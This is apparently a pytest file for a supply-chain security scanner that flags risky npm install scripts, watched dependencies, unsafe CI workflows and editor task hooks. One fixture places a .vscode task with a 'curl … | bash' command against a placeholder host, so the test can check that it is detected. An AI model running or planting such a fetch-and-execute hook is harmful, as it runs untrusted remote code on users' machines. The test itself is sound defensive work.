"""Tests for scripts/ops/supply_chain_guard.py."""

from __future__ import annotations

import importlib.util
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "scripts" / "ops" / "supply_chain_guard.py"

SPEC = importlib.util.spec_from_file_location("supply_chain_guard", SCRIPT)
assert SPEC and SPEC.loader
supply_chain_guard = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = supply_chain_guard
SPEC.loader.exec_module(supply_chain_guard)


def _write_json(path: Path, payload: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload), encoding="utf-8")


def test_package_json_flags_root_lifecycle_and_active_campaign_dependency(tmp_path: Path) -> None:
    _write_json(
        tmp_path / "package.json",
        {
            "scripts": {"postinstall": "node scripts/setup.js"},
            "dependencies": {"@antv/g2": "^6.0.0", "hono": "4.7.0"},
        },
    )

    findings = supply_chain_guard.scan_repo(tmp_path)
    codes = {finding.code for finding in findings}

    assert "root_lifecycle_script" in codes
    assert "active_campaign_ecosystem_dependency" in codes
    assert "floating_dependency_specs" in codes


def test_package_lock_flags_transitive_install_scripts_and_watched_scope(tmp_path: Path) -> None:
    _write_json(
        tmp_path / "package-lock.json",
        {
            "packages": {
                "": {"name": "example", "version": "1.0.0"},
                "node_modules/@tanstack/react-query": {
                    "name": "@tanstack/react-query",
                    "version": "5.90.0",
                    "resolved": "https://registry.npmjs.org/@tanstack/react-query/-/react-query-5.90.0.tgz",
                },
                "node_modules/native-tool": {
                    "name": "native-tool",
                    "version": "1.2.3",
                    "hasInstallScript": True,
                    "resolved": "https://example.invalid/native-tool.tgz",
                },
            }
        },
    )

    findings = supply_chain_guard.scan_repo(tmp_path)
    codes = {finding.code for finding in findings}

    assert "lockfile_active_campaign_ecosystem" in codes
    assert "lockfile_transitive_install_scripts" in codes
    assert "lockfile_non_registry_resolution" in codes


def test_package_lock_flags_historical_review_dependency_as_medium(tmp_path: Path) -> None:
    _write_json(
        tmp_path / "package-lock.json",
        {
            "packages": {
                "node_modules/axios": {
                    "version": "1.16.1",
                    "resolved": "https://registry.npmjs.org/axios/-/axios-1.16.1.tgz",
                }
            }
        },
    )

    findings = supply_chain_guard.scan_repo(tmp_path)

    assert [(f.code, f.severity) for f in findings] == [
        ("lockfile_historical_incident_ecosystem", "medium")
    ]


def test_workflow_flags_pull_request_target_dependency_install(tmp_path: Path) -> None:
    workflow = tmp_path / ".github" / "workflows" / "ci.yml"
    workflow.parent.mkdir(parents=True)
    workflow.write_text(
        """
        on: pull_request_target
        jobs:
          test:
            steps:
              - run: npm ci
        """,
        encoding="utf-8",
    )

    findings = supply_chain_guard.scan_repo(tmp_path)

    assert any(f.code == "pull_request_target_installs_dependencies" for f in findings)
    assert any(f.code == "ci_install_without_ignore_scripts" for f in findings)


def test_agent_config_flags_network_to_shell_persistence(tmp_path: Path) -> None:
    settings = tmp_path / ".vscode" / "tasks.json"
    settings.parent.mkdir(parents=True)
    settings.write_text(
        '{"tasks":[{"label":"warm","command":"curl https://example.invalid/x.sh | bash"}]}',
        encoding="utf-8",
    )

    findings = supply_chain_guard.scan_repo(tmp_path)

    assert any(f.code == "agent_or_editor_persistence_hook" for f in findings)


def test_report_and_markdown_for_clean_repo(tmp_path: Path) -> None:
    _write_json(tmp_path / "package.json", {"dependencies": {"hono": "4.7.0"}})

    report = supply_chain_guard.build_report([tmp_path])
    markdown = supply_chain_guard.render_markdown(report)

    assert report["summary"]["total_findings"] == 0
    assert "No findings." in markdown
